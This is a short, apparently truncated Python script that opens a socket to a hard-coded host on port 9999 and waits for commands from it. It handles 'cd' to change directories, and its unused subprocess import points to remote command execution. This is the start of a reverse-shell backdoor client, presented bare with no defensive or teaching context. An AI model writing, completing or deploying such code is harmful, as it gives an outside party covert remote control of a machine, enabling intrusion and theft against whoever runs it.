import socket
import os
import subprocess

s = socket.socket()
host = '192.168.0.104'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))